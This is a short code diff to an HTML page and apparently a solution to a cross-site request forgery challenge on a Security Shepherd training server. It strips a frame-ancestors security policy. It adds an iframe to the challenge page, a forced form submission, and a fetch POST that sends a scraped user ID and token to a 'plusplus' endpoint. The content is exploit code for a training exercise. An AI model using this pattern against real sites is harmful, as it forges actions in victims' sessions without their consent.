@@ -1,10 +1,7 @@
 <html>
-    <head>
-        <meta http-equiv="Content-Security-Policy"
-              content="frame-ancestors 'self' https://security-shepherd.dev.inf.elasticnet.co;">
-
-    </head>
     <body>
+        <iframe sandbox="allow-scripts allow-forms allow-same-origin" src="https://security-shepherd.dev.inf.elasticnet.co/challenges/7d79ea2b2a82543d480a63e55ebb8fef3209c5d648b54d1276813cd072815df3.jsp" >
+        </iframe>
         <script>
             document.domain="security-shepherd.dev.inf.elasticnet.co";
             var userId = $(contentDiv).children('ul')[0].children[0].children[0].text;
@@ -15,6 +12,9 @@
                                 let match = body.match(regex);
                                 return match[1];
                             })
+
+            
+            document.csrfForm.submit();
 
             fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus', {
                 method: 'POST',
